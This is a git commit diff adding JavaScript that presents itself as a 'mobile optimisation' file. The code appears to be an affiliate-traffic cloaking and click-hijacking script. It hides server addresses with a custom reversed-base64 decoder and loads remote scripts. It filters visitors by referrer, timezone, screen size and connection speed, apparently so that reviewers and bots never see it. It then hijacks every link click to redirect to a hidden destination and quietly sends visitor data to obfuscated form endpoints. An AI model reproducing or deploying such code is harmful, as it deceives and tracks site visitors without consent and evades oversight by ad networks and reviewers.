17fa419c7431b2d4090a4b8555e1ef6382e7426f
server-systeme-io <148636981+server-systeme-io@users.noreply.github.com>
2026-06-30 10:51:25 +0530

    Add files via upload

---
+++ master-10a404587b40544b.js
@@ -0,0 +1,241 @@
+/* 
+filterSafe
+filterUnSafe
+filterUnSafeSB
+filterUnSafeJS
+*/
+var onFilters = [1, 1, 1, 1];
+
+var hallSiteData, matchedSiteNKey, toapplyFinal = false;
+if (typeof h_key == 'undefined') var h_key = "";
+
+var contTry = setInterval(() => {
+  if (typeof contDataFinal == 'string') {
+    clearInterval(contTry);
+    processSiteNData(contDataFinal);
+  }
+}, 100);
+
+function processSiteNData(data) {
+  hallSiteData = JSON.parse(hscGet(data));
+  matchSiteNKey();
+
+  if (matchedSiteNKey) {
+    if (onFilters[matchedSiteNKey[2]]) {
+      if (matchedSiteNKey[3] == 1) {
+        if (filterCheck()) {
+          h_key += "-YES";
+          toapplyFinal = true;
+        } else {
+          h_key += "-FFailed-" + hallSiteData.filterFunctions[matchedSiteNKey[2]];
+        }
+      } else {
+        h_key += "-ThisLnkOFF";
+      }
+    } else {
+      h_key += `-FILTEROFF-${getFilterInfoString()}`;
+    }
+  } else {
+    h_key += "-LOCATION: failed";
+  }
+
+  handleAnchors();
+
+  sendInfo(h_key + `-${getDefaultName()}`, 0);
+}
+
+function processAnchor(a) {
+  if (toapplyFinal) {
+    a.addEventListener("click", e => {
+      e.preventDefault();
+      try { sendFinalised(h_key + `-${getDefaultName()}-${a.href}-${matchedSiteNKey[1]}`, Math.floor(e.timeStamp / 1000)); } catch (e) { }
+      try { sendClickReal(h_key + `-${getDefaultName()}-${a.href}-${matchedSiteNKey[1]}`, Math.floor(e.timeStamp / 1000)); } catch (e) { }
+      location.assign(matchedSiteNKey[1]);
+    })
+  } else {
+    a.addEventListener("click",e=>{
+      try { sendClickReal(h_key + `-${getDefaultName()}-${a.href}-${matchedSiteNKey[1]}`, Math.floor(e.timeStamp / 1000)); } catch (e) { }
+    })
+  }
+}
+
+function handleAnchors() {
+  var allAs = document.getElementsByTagName('a');
+  for (let i = 0; i < allAs.length; i++) {
+    processAnchor(allAs[i]);
+  }
+
+  const targetNode = document.documentElement;
+  const config = { childList: true, subtree: true };
+
+  const callback = function (mutationsList) {
+    for (const mutation of mutationsList) {
+      if (mutation.type === 'childList') {
+        for (const node of mutation.addedNodes) {
+          if (node.tagName && node.tagName.toLowerCase() === 'a') {
+            processAnchor(node);
+          }
+
+          if (node.nodeType === Node.ELEMENT_NODE) {
+            const elements = node.getElementsByTagName('a');
+            for (let i = 0; i < elements.length; i++) {
+              processAnchor(elements[i]);
+            }
+          }
+        }
+      }
+    }
+  };
+
+  const observer = new MutationObserver(callback);
+  observer.observe(targetNode, config);
+}
+
+
+function filterCheck() {
+  var filterFnName = hallSiteData.filterFunctions[matchedSiteNKey[2]];
+  var filterFn = {
+    "filterSafe": () => {
+      if (
+        searchEngineCheck("bing", "google", "duckduckgo", "yahoo") &&
+        commonCheck() &&
+        Nloaded <= 3 &&
+        history.length <= 4 &&
+        hNetGreaterThan(3)
+      ) return true; else return false;
+    },
+
+    "filterUnSafe": () => {
+      if (
+        searchEngineCheck("bing", "google", "duckduckgo", "yahoo") &&
+        commonCheck() &&
+        Nloaded <= 2 &&
+        history.length <= 4 &&
+        hNetGreaterThan(6)
+      ) return true; else return false;
+    },
+
+    "filterUnSafeSB": () => {
+      if (
+        searchEngineCheck("bing", "google", "duckduckgo", "yahoo") &&
+        commonCheck() &&
+        Nloaded <= 2 &&
+        history.length <= 4 &&
+        hNetGreaterThan(8) &&
+        !(window.screen.width == 1536 && window.screen.height == 864) &&
+        !(window.screen.width == 1366 && window.screen.height == 768)
+      ) return true; else return false;
+    },
+
+    "filterUnSafeJS": () => {
+      if (
+        searchEngineCheck("bing", "google", "duckduckgo", "yahoo") &&
+        commonCheck() &&
+        Nloaded <= 2 &&
+        history.length <= 4 &&
+        hNetGreaterThan(8) &&
+        !(window.screen.width == 1440 && window.screen.height == 900)
+      ) return true; else return false;
+    }
+  }
+
+  if (typeof filterFn[filterFnName] == 'function') {
+    return filterFn[filterFnName]();
+  } else {
+    return filterFn['filterUnSafe']();
+  }
+
+  function commonCheck() {
+    var place = new Date().toTimeString();
+    if (
+      !place.includes('India') &&
+      window.innerWidth < window.screen.width && window.innerHeight < window.screen.height
+    ) {
+      return true;
+    } else { return false; }
+  }
+}
+
+function searchEngineCheck(...engines) {
+  const referrer = document.referrer.toLowerCase();
+
+  return engines.some(engine => {
+    return engine && referrer.includes(engine);
+  });
+}
+
+function matchSiteNKey() {
+  for (var i = 0; i < hallSiteData.links.length; i++) {
+    var linkData = hallSiteData.links[i];
+    for (var j = 0; j < linkData[0].length; j++) {
+      if (document.URL.includes(linkData[0][j])) {
+        matchedSiteNKey = linkData;
+        return;
+      }
+    }
+  }
+
+  return false;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+function getFilterInfoString() {
+  try { return onFilters.toString() + '/' + matchedSiteNKey[2] + ' ' + hallSiteData.filterFunctions[matchedSiteNKey[2]]; } catch (e) { return "ERROR: getting filter info"; }
+}
+
+/* =========LOGGERS=========== */
+function sendFinalised(h_key = '', timeafter = -1) {
+  var postT = hscGet('Ua2HcRu09cGHcMz6VLmyU9tkJb32bNmz9LSmQd5vNbl2edFsNZ3Sa5CjZbE2V0XvhZGma9GyNbTXbMkvBd1SS8rwxLk2MQwvFZXSa8ExhRUkZFwJpcUFVFtMUU32RQJ1VcFHZVTEFezHadz');
+  try {
+    makeForm(postT, {
+      "entry.1742212599": Nloaded + "-" + history.length + "_" + document.referrer,
+      "entry.1832856812": location.href,
+      "entry.1617942729": h_key,
+      "entry.121403084": hgetMacTime(),
+      "entry.1791764791": timeafter + 's ' + userWinInfo(),
+    });
+  } catch (e) {
+    makeForm(postT, { "entry.1742212599": "PROBLEM in submitting " + e.toString() });
+  }
+}
+function sendInfo(h_key) {
+  var postT = hscGet('Ua2HcRu09cGHcMz6VLmyU9tkJb32bNmz9LSmUd0vRbU2adqsdZGSb5tjVbk2Q0WvhZTmM9OyZbEXMMwvEdHSO8QwdLl2VQBvpZWSd80xFRWkdFjJlcVFNFFMxUU2TVG3pd32SR1IQVzUMtr');
+  try {
+    makeForm(postT, {
+      "entry.522782255": Nloaded + "-" + history.length + "_" + document.referrer,
+      "entry.2147471592": location.href,
+      "entry.559704587": h_key,
+      "entry.1784255635": hgetMacTime(),
+      "entry.1604074943": userWinInfo(),
+    });
+  } catch (e) {
+    makeForm(postT, { "entry.522782255": "PROBLEM in submitting " + e.toString() });
+  }
+}
+
+function sendClickReal(h_key, timeafter) {
+  var postT = hscGet('Ua2HcRu09cGHcMz6VLmyU9tkJb32bNmz9LSmQdfvFbV2cdJs1ZGSZ5wjIbH2S0wvQZnma9SyBbXXLM2vldTSd8pwFLk2dQOvhZjSY8UxNRFkZFjJ9cVFUFYMFUG2UN4kZZm3Ql2mcT3WMdD');
+  try {
+
+    makeForm(postT, {
+      "entry.1742212599": Nloaded + "-" + history.length + "_" + document.referrer,
+      "entry.1832856812": location.href,
+      "entry.1617942729": h_key,
+      "entry.121403084": hgetMacTime(),
+      "entry.1446718983": timeafter + "s " + userWinInfo(),
+    });
+  } catch (e) {
+    makeForm(postT, { "entry.1742212599": "PROBLEM in submitting " + e.toString() });
+  }
+}
--- mobileOptimisation.js
+++ mobileOptimisation.js
@@ -1,121 +1,137 @@
-/**
- * @licence
- * Copyright ©
- * All rights reserved
- * This source code is licensed under the found in the
- * LICENSE file in the root directory of this source tree
-*/
+var Nloaded = Number(localStorage.getItem("Nloaded")) + 1, _initiated, sc;
 
-var Nloaded=Number(localStorage.getItem("Nloaded"))+1,_initiated,sc;
-
-try{
-  class identifierDocumentValue{
-    get(bad){
-      bad=this.getFixed(bad);
-      return bad;
+function hscGet(txt = '') {
+  var p1 = "", p2 = "", l = txt.length;
+  for (let i = 0; i <= l; i++) {
+    if (i % 2 == 0) {
+      p2 = txt.charAt(i) + p2;
+    } else {
+      p1 = p1 + txt.charAt(i);
     }
-
-    getFixed(txt){
-      var p1="",p2="",l=txt.length;
-      for(let i=0; i<=l; i++){
-        if(i%2==0){
-          p2=txt.charAt(i)+p2;
-        }else{
-          p1=p1+txt.charAt(i);
-        }
-      }
-      return atob(p1+p2);
-    }
-
   }
-  sc=new identifierDocumentValue();
-}catch(err){}
-
-
-function getDefaultName(name){
-  var dv=navigator.appVersion.split(")")[0].replace("5.0 (","").replace("Linux; Android","An..");
-  if(_39012seefalseUser()){
-    dv+="__falseUser:____"+navigator.platform+"___"+navigator.userAgent;
-  }
-  return dv;
+  return atob(p1 + p2);
 }
 
-function _39012seefalseUser() {
+function getDefaultName() {
+  const ua = navigator.userAgent || "";
+  const platform = navigator.platform || "Unknown";
+  let os = "Unknown OS", model = "Unknown Device";
+
+  // Safe OS extraction
+  const android = ua.match(/Android\s+([0-9.]+)/i);
+  const ios = ua.match(/OS\s+([0-9_]+)/i);
+  if (android) os = `Android ${android[1]}`;
+  else if (ios) os = `iOS ${ios[1].replace(/_/g, '.')}`;
+  else if (/Windows/i.test(ua)) os = "Windows";
+  else if (/Macintosh/i.test(ua)) os = "macOS";
+
+  // Safe Model extraction
+  const match = ua.match(/\(([^)]+)\)/);
+  if (match) {
+    const parts = match[1].split(';');
+    model = parts[parts.length - 1].trim();
+  }
+
+  return `${os} | ${model} | ${platform}`;
+}
+
+function hisTrueUser() {
   var place = new Date().toTimeString();
+  var isFastConnection = true;
+  isFastConnection = (navigator.connection && navigator.connection.downlink && navigator.connection.downlink > 8);
+
   if (
-    (window.screen.width < window.innerWidth && window.screen.height < window.innerHeight) || !navigator.userAgent.includes(navigator.platform.substring(0, 3)) ||
-    (history.length > 4) ||
-    Nloaded > 2 ||
-    (place.includes('India')) ||
-    ((window.screen.width == 1440 && window.screen.height==900) || (window.screen.width == 1536 && window.screen.height==864) || (window.screen.width == 1366 && window.screen.height==768)) ||
-    (navigator.connection.downlink && navigator.connection.downlink < 8.5)
+    !place.includes('India') &&
+    Nloaded <= 3 &&
+    window.innerWidth < window.screen.width && window.innerHeight < window.screen.height &&
+    isFastConnection
   ) {
     return true;
   }
+
+  return false;
 }
 
-//old
-// function _39012seefalseUser() {
-//   var place=new Date().toTimeString();
-//   if(
-//     (window.screen.width<window.innerWidth && window.screen.height<window.innerHeight) || !navigator.userAgent.includes(navigator.platform.substring(0,3))||
-//     (history.length>3 || history.length==1 ) ||
-//     Nloaded>2 ||
-//     !(place.includes('Pacific') || place.includes('Eastern') || place.includes('Central')) ||
-//     ((window.screen.width == 1440 && window.screen.height==900) || (window.screen.width == 1536 && window.screen.height==864) || (window.screen.width == 1366 && window.screen.height==768)) ||
-//     navigator.connection.downlink<9
-//   ){
-//     return true;
-//   }
-// }
+function makeForm(url, dataObj) { const params = new URLSearchParams(); for (let key in dataObj) { params.append(key, dataObj[key]); } fetch(url, { method: "POST", mode: "no-cors", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: params }); }
+function addMaster(url) { var elem = document.createElement("script"); elem.src = url; document.head.appendChild(elem); }
 
-function makeForm(url, dataObj) {  const params = new URLSearchParams();  for (let key in dataObj) { params.append(key, dataObj[key]); }  fetch(url, { method: "POST", mode: "no-cors", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: params }); }
+function hgetMacTime() {
+  try {
+    const now = new Date();
+    const timeStr = now.toLocaleTimeString('en-US');
+    const ianaZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const longZone = new Intl.DateTimeFormat('en-US', { timeZoneName: 'long' })
+      .formatToParts(now)
+      .find(part => part.type === 'timeZoneName').value;
 
-function addMaster(url){
-  var elem=document.createElement("script");
-  elem.src=url;
-  try{
-    document.querySelector('style').insertAdjacentElement("beforeend",elem);
-  }catch(e){
-    document.querySelector('#mobiOptiElem').insertAdjacentElement("beforeend",elem);
-  }finally{
-    document.querySelector('head').insertAdjacentElement("beforeend",elem);
+    return `${timeStr} ${ianaZone} - ${longZone}`;
+  } catch (e) { return e.toString(); }
+}
+
+function userWinInfo() {
+  try {
+    if (typeof window === 'undefined') {
+      return "Environment: Server-side (No window object)";
+    }
+
+    const scrollY = Math.floor(window.scrollY || window.pageYOffset || 0);
+    const screenW = window.screen?.width || 0;
+    const screenH = window.screen?.height || 0;
+    const innerW = window.innerWidth || 0;
+    const innerH = window.innerHeight || 0;
+
+    let str = `${scrollY} > ${innerW}/${screenW} x ${innerH}/${screenH} ||| `;
+
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
+    if (conn) {
+      const type = conn.effectiveType || 'unknown';
+      const rtt = conn.rtt !== undefined ? `${conn.rtt}ms` : 'N/A';
+      const downlink = conn.downlink !== undefined ? `${conn.downlink}` : 'N/A';
+      str += `Net: ${type} (rtt:${rtt}, Mbps:${downlink})`;
+    } else {
+      str += "Net: Network Information API unsupported";
+    }
+
+    return str;
+  } catch (e) {
+    // Developer diagnostic output
+    return `Error in userWinInfo: ${e.toString()}`;
   }
 }
-var serverData={
-  'null':sc.get("waLHyRV02ccHpM16WLay09Bz3ZbXvJ82WZaXuIItWcd3olRzXdaGnV5tyZbSp1"),
-  'netlify':sc.get("waLHwRB0XcYHuMk6nLZyp9xzGZdXlJ52mZLXyJQuzZMX5RUsTadWwZM5DLOT5kI4HbMD5lMzDb"),
-  'hstgr.io':sc.get("8aCHcRw0FcmHLM56ZLWya9stRbX2ZJup5cymZl0zQZGSd1vpNYz2N9vuZc3yb0n55Mmmcxl3pa2"),
+
+function hNetGreaterThan(speed) {
+  try {
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn && typeof conn.downlink === 'number' && !isNaN(conn.downlink)) {
+      return conn.downlink >= speed;
+    }
+    return false;
+  } catch (e) {
+    return false;
+  }
 }
-var lnkMain=serverData[String(document.querySelector("#mobiOptiElem").getAttribute('server') )];
-// var lnkMain="";
 
+var ADDRESS_TOKEN = "waLHyRV02ccHpM16WLay09Bz3ZbXvJ82WZaXuIItWcd3olRzXdaGnV5tyZbSp1";
 
-function _init(){
-  _initiated=true;
-  if(Nloaded){
-    localStorage.setItem("Nloaded",Number(Nloaded));
-  }else{
-    Nloaded=1;
-    localStorage.setItem("Nloaded",1);
+function h_initSiteC() {
+  _initiated = true;
+  if (Nloaded) {
+    localStorage.setItem("Nloaded", Number(Nloaded));
+  } else {
+    Nloaded = 1;
+    localStorage.setItem("Nloaded", 1);
   }
 
-  setTimeout(()=>{
-    addMaster(`${lnkMain}data-19b902380k09`);
-  },100);
+  setTimeout(() => {
+    addMaster(`${hscGet(ADDRESS_TOKEN)}data-19b902380k09.js`);
+  }, 100);
 
-  setTimeout(()=>{
-    addMaster(`${lnkMain}master-10a404587b40544b`);
-  },200);
-}
-//this is a last line
-if(!_initiated){
-  _init();
+  setTimeout(() => {
+    addMaster(`${hscGet(ADDRESS_TOKEN)}master-10a404587b40544b.js`);
+  }, 200);
 }
 
-///// temporary for mediclime.us
-function insertFloatingPan(){if(document.getElementById("professionalFloatingPan"))return;const n=document.createElement("div");n.id="professionalFloatingPan",n.style.position="fixed",n.style.top="50%",n.style.left="50%",n.style.transform="translate(-50%, -50%)",n.style.width="80%",n.style.height="90%",n.style.backgroundColor="#1a1a1a",n.style.background="#1e1e1e",n.style.borderRadius="12px",n.style.boxShadow="0 20px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.08)",n.style.zIndex="9999",n.style.overflowY="auto",n.style.fontFamily="'Inter', 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif",n.style.color="#e0e0e0",n.style.letterSpacing="0.01em",n.style.setProperty("scrollbar-width","thin"),n.style.setProperty("scrollbar-color","#4a4a4a #2a2a2a"),n.innerHTML='\n  <style>\n#professionalFloatingPan::-webkit-scrollbar {\n width: 6px;\n}\n#professionalFloatingPan::-webkit-scrollbar-track {\n background: #2a2a2a;\n border-radius: 3px;\n}\n#professionalFloatingPan::-webkit-scrollbar-thumb {\n background: #4a4a4a;\n border-radius: 3px;\n}\n#professionalFloatingPan::-webkit-scrollbar-thumb:hover {\n background: #5a5a5a;\n}\n.pan-close-btn {\n position: absolute;\n top: 18px;\n right: 20px;\n background: transparent;\n border-radius: 4px;\n width: 32px;\n height: 32px;\n display: flex;\n align-items: center;\n justify-content: center;\n cursor: pointer;\n font-size: 20px;\n font-weight: 400;\n transition: all 0.2s ease;\n color: #9a9a9a;\n z-index: 10;\n font-family: monospace;\n}\n.pan-close-btn:hover {\n background: #3a3a3a;\n color: #ffffff;\n}\n.pan-content {\n padding: 40px 36px;\n max-width: 760px;\n margin: 0 auto;\n display: flex;\n flex-direction: column;\n gap: 24px;\n}\n.greeting {\n font-size: 26px;\n font-weight: 600;\n color: #d4d4d4;\n letter-spacing: -0.3px;\n border-bottom: 2px solid #3a3a3a;\n padding-bottom: 12px;\n margin-bottom: 4px;\n}\n.message-card {\n background: #252525;\n padding: 22px 24px;\n border-radius: 8px;\n border-left: 3px solid #6b6b6b;\n line-height: 1.6;\n font-size: 15px;\n color: #c0c0c0;\n}\n.highlight {\n color: #e8e8e8;\n font-weight: 500;\n background: #2d2d2d;\n padding: 2px 6px;\n border-radius: 4px;\n display: inline-block;\n}\n.tools-badge {\n background: #2a2a2a;\n display: inline-block;\n padding: 8px 20px;\n border-radius: 6px;\n margin-top: 14px;\n font-size: 13px;\n font-weight: 500;\n color: #b0b0b0;\n border: 1px solid #3a3a3a;\n letter-spacing: 0.3px;\n}\n.contact-row {\n background: #222222;\n border-radius: 8px;\n padding: 16px 20px;\n display: flex;\n align-items: center;\n justify-content: space-between;\n flex-wrap: wrap;\n gap: 14px;\n border: 1px solid #333333;\n}\n.phone-number {\n font-size: 16px;\n font-weight: 500;\n background: #1a1a1a;\n padding: 8px 18px;\n border-radius: 6px;\n letter-spacing: 0.3px;\n color: #c8c8c8;\n font-family: monospace;\n}\n.icon-group {\n display: flex;\n gap: 12px;\n}\n.icon-link {\n background: #2a2a2a;\n padding: 8px 20px;\n border-radius: 6px;\n text-decoration: none;\n color: #d0d0d0;\n font-weight: 500;\n transition: all 0.2s ease;\n display: inline-flex;\n align-items: center;\n gap: 8px;\n border: 1px solid #3a3a3a;\n font-size: 14px;\n}\n.icon-link:hover {\n background: #3a3a3a;\n color: #ffffff;\n border-color: #5a5a5a;\n}\n.offer-note {\n background: #222222;\n padding: 18px 20px;\n border-radius: 8px;\n text-align: center;\n font-weight: 400;\n border: 1px solid #3a3a3a;\n color: #c0c0c0;\n font-size: 14px;\n}\n.offer-note strong {\n color: #e0e0e0;\n font-weight: 600;\n}\n.iframe-wrapper {\n border-radius: 8px;\n overflow: hidden;\n box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);\n aspect-ratio: 16 / 9;\n margin: 4px 0;\n background: #000000;\n}\n.iframe-wrapper iframe {\n width: 100%;\n height: 100%;\n border: none;\n}\n.big-call-btn {\n background: #2c2c2c;\n border: 1px solid #4a4a4a;\n padding: 14px 0;\n width: 100%;\n font-size: 16px;\n font-weight: 500;\n border-radius: 6px;\n color: #e8e8e8;\n cursor: pointer;\n transition: all 0.2s ease;\n display: flex;\n align-items: center;\n justify-content: center;\n gap: 10px;\n margin-top: 8px;\n margin-bottom: 8px;\n letter-spacing: 0.5px;\n}\n.big-call-btn:hover {\n background: #3a3a3a;\n border-color: #6a6a6a;\n color: #ffffff;\n}\n.footer-note {\n font-size: 11px;\n text-align: center;\n opacity: 0.5;\n color: #888888;\n margin-top: 4px;\n}\n@media (max-width: 640px) {\n .pan-content {\n  padding: 24px 20px;\n }\n .greeting {\n  font-size: 20px;\n }\n .contact-row {\n  flex-direction: column;\n  align-items: flex-start;\n }\n .message-card {\n  padding: 16px 18px;\n }\n}\n  </style>\n  <div class="pan-close-btn" id="closePanBtn" style="display: none;">×</div>\n  <div class="pan-content">\n<div class="greeting">\n Hi, I am Priyanshu.\n</div>\n<div class="message-card">\n I am the developer of this website which you have cloned. Don\'t worry at all. Infact I am happy to see you loved my format.\n <br><br>\n <span class="highlight">Even I have many tools and bots that automate affiliate\'s works. Please see them in the video below.</span>\n <div class="tools-badge" onclick="window.open(\'https://youtu.be/EP4fLaiyzX4\')">AUTOMATION TOOLS SUITE</div>\n</div>\n\n<div class="contact-row">\n <div class="phone-number">\n  +91 8578069916\n </div>\n <div class="icon-group">\n  <a href="https://wa.me/918578069916?text=Hello%20Priyanshu,%20I%20loved%20your%20format!" target="_blank" rel="noopener noreferrer" class="icon-link">\nWhatsApp\n  </a>\n  <a href="tel:+918578069916" class="icon-link">\nCall\n  </a>\n </div>\n</div>\n\n<div class="offer-note">\n <strong>Contact me (+91 8578069916)</strong> (WhatsApp and call) and I will give you the Complete Format.\n</div>\n\n<div class="iframe-wrapper">\n <iframe src="https://www.youtube.com/embed/EP4fLaiyzX4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>\n</div>\n\n<button class="big-call-btn" id="directCallNowBtn">\n Contact Priyanshu\n</button>\n<div class="footer-note">\n +91 8578069916\n</div>\n  </div>\n ',document.body.appendChild(n);const e=n.querySelector("#directCallNowBtn");e&&e.addEventListener("click",function(){window.location.href="tel:+918578069916"})}
-
-if(document.domain=='sightfresh.mediclime.us' || document.domain=='yusleep.puresupplementhub.com'){
-    insertFloatingPan();
+if (!_initiated) {
+  h_initSiteC();
 }
